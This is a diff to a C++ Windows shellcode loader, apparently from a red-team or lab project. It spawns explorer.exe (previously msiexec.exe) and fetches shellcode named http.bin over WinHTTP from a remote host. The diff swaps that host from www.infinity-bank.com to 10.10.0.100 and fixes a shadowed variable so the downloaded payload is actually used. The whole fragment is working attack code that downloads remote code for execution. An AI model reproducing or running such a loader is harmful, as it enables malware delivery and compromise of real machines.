@@ -22,7 +22,7 @@ int main(int argc, char* argv[])
 
     // null terminated command line
    // wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
-    wchar_t cmd[] = L"C:\\Windows\\System32\\msiexec.exe\0";
+    wchar_t cmd[] = L"C:\\Windows\\explorer.exe\0";
     // create process
     BOOL success = CreateProcess(
         NULL,
@@ -39,12 +39,12 @@ int main(int argc, char* argv[])
     // download shellcode
     std::vector<BYTE> shellcode;
     if (argc != 2) {
-        std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"http.bin\0");
+        shellcode = Download(L"10.10.0.100\0", L"http.bin\0");
     }
     else {
         std::string p = argv[1];
         std::wstring ptemp = std::wstring(p.begin(), p.end());
-        shellcode = Download(L"www.infinity-bank.com\0", ptemp.c_str());
+        shellcode = Download(L"10.10.0.100\0", ptemp.c_str());
     }
 
 
@@ -185,7 +185,7 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
     WinHttpCloseHandle(hSession);
 
     return buffer;
-}   
+}
 
 
 // SSL
